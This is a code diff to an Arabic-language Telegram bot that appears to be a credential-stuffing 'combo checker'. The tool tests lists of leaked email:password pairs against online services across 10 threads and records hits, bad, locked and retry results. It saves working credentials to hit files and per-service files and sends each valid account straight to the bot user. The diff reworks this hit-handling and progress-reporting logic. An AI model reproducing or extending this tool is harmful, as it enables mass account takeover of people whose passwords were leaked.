@@ -926,7 +926,7 @@ async def process_combos(query, context, file_path, lines, scan_type):
     def check_single(line):
         """Check single combo - thread safe"""
         if ':' not in line:
-            return None
+            return {"status": "skip"}
         
         try:
             parts = line.split(':', 1)
@@ -948,7 +948,7 @@ async def process_combos(query, context, file_path, lines, scan_type):
             }
         except Exception as e:
             logger.error(f"Error in check_single: {e}")
-            return None
+            return {"status": "error"}
     
     # Start checking with 10 threads
     results_list = []
@@ -961,28 +961,28 @@ async def process_combos(query, context, file_path, lines, scan_type):
         for future in as_completed(future_to_line):
             result = future.result()
             
-            if result:
-                with stats_lock:
-                    stats["processed"] += 1
+            # Always update processed count
+            with stats_lock:
+                stats["processed"] += 1
+                
+                if result and result.get("status") == "hit":
+                    stats["hit"] += 1
                     
-                    if result["status"] == "hit":
-                        stats["hit"] += 1
+                    # Save hit
+                    hit_file = os.path.join(result_dir, "Hits_All.txt")
+                    with open(hit_file, 'a', encoding='utf-8') as f:
+                        f.write(f"{result['email']}:{result['password']} | {result['message']}\n")
+                    
+                    # Save per service
+                    for service_name in result.get("services", {}).keys():
+                        stats["services_found"][service_name] = stats["services_found"].get(service_name, 0) + 1
                         
-                        # Save hit
-                        hit_file = os.path.join(result_dir, "Hits_All.txt")
-                        with open(hit_file, 'a', encoding='utf-8') as f:
-                            f.write(f"{result['email']}:{result['password']} | {result['message']}\n")
-                        
-                        # Save per service
-                        for service_name in result["services"].keys():
-                            stats["services_found"][service_name] = stats["services_found"].get(service_name, 0) + 1
-                            
-                            service_file = os.path.join(result_dir, services[service_name]["file"])
-                            with open(service_file, 'a', encoding='utf-8') as f:
-                                f.write(f"{result['email']}:{result['password']}\n")
-                        
-                        # Send hit immediately
-                        hit_msg = f"""
+                        service_file = os.path.join(result_dir, services[service_name]["file"])
+                        with open(service_file, 'a', encoding='utf-8') as f:
+                            f.write(f"{result['email']}:{result['password']}\n")
+                    
+                    # Send hit immediately
+                    hit_msg = f"""
 🎯 <b>حساب صحيح!</b> #{stats["hit"]}
 
 📧 <b>Email:</b> <code>{result['email']}</code>
@@ -991,45 +991,51 @@ async def process_combos(query, context, file_path, lines, scan_type):
 {result['message']}
 
 💎 <b>Created by @TTT9KK</b>
-                        """
-                        
-                        try:
-                            import asyncio
-                            loop = asyncio.new_event_loop()
-                            asyncio.set_event_loop(loop)
-                            loop.run_until_complete(
-                                context.bot.send_message(
-                                    chat_id=user_id,
-                                    text=hit_msg,
-                                    parse_mode='HTML'
-                                )
+                    """
+                    
+                    try:
+                        import asyncio
+                        loop = asyncio.new_event_loop()
+                        asyncio.set_event_loop(loop)
+                        loop.run_until_complete(
+                            context.bot.send_message(
+                                chat_id=user_id,
+                                text=hit_msg,
+                                parse_mode='HTML'
                             )
-                            loop.close()
-                        except Exception as e:
-                            logger.error(f"Error sending hit msg: {e}")
+                        )
+                        loop.close()
+                    except Exception as e:
+                        logger.error(f"Error sending hit msg: {e}")
+                
+                elif result and result.get("status") == "bad":
+                    stats["bad"] += 1
                     
-                    elif result["status"] == "bad":
-                        stats["bad"] += 1
-                    elif result["status"] == "locked":
-                        stats["locked"] += 1
-                    elif result["status"] == "retry":
-                        stats["retry"] += 1
+                elif result and result.get("status") == "locked":
+                    stats["locked"] += 1
                     
-                    # Update progress every 10
-                    if stats["processed"] % 10 == 0 or stats["processed"] >= stats["total"]:
-                        progress = (stats["processed"] / stats["total"]) * 100
-                        
-                        elapsed = time.time() - start_time
-                        if stats["processed"] > 0:
-                            avg_time = elapsed / stats["processed"]
-                            remaining = (stats["total"] - stats["processed"]) * avg_time
-                            eta_min = int(remaining / 60)
-                            eta_sec = int(remaining % 60)
-                            eta_text = f"\n⏱️ المتبقي: ~{eta_min}د {eta_sec}ث"
-                        else:
-                            eta_text = ""
-                        
-                        progress_text = f"""
+                elif result and result.get("status") == "retry":
+                    stats["retry"] += 1
+                
+                else:
+                    # Any other status (error, skip, etc) counts as bad
+                    stats["bad"] += 1
+                
+                # Update progress every 10
+                if stats["processed"] % 10 == 0 or stats["processed"] >= stats["total"]:
+                    progress = (stats["processed"] / stats["total"]) * 100
+                    
+                    elapsed = time.time() - start_time
+                    if stats["processed"] > 0:
+                        avg_time = elapsed / stats["processed"]
+                        remaining = (stats["total"] - stats["processed"]) * avg_time
+                        eta_min = int(remaining / 60)
+                        eta_sec = int(remaining % 60)
+                        eta_text = f"\n⏱️ المتبقي: ~{eta_min}د {eta_sec}ث"
+                    else:
+                        eta_text = ""
+                    
+                    progress_text = f"""
 ⏳ <b>جاري الفحص بـ 10 ثريدات...</b>
 
 📊 التقدم: {stats["processed"]}/{stats["total"]} ({progress:.1f}%)
@@ -1040,19 +1046,20 @@ async def process_combos(query, context, file_path, lines, scan_type):
 🔒 مقفل: {stats["locked"]}
 🔄 إعادة: {stats["retry"]}
 
+💡 كل حساب صحيح يُرسل فوراً!
 💎 <b>Created by @TTT9KK</b>
-                        """
-                        
-                        try:
-                            import asyncio
-                            loop = asyncio.new_event_loop()
-                            asyncio.set_event_loop(loop)
-                            loop.run_until_complete(
-                                status_msg.edit_text(progress_text, parse_mode='HTML')
-                            )
-                            loop.close()
-                        except:
-                            pass
+                    """
+                    
+                    try:
+                        import asyncio
+                        loop = asyncio.new_event_loop()
+                        asyncio.set_event_loop(loop)
+                        loop.run_until_complete(
+                            status_msg.edit_text(progress_text, parse_mode='HTML')
+                        )
+                        loop.close()
+                    except Exception as e:
+                        logger.error(f"Error updating progress: {e}")
     
     # Final results
     final_text = f"""
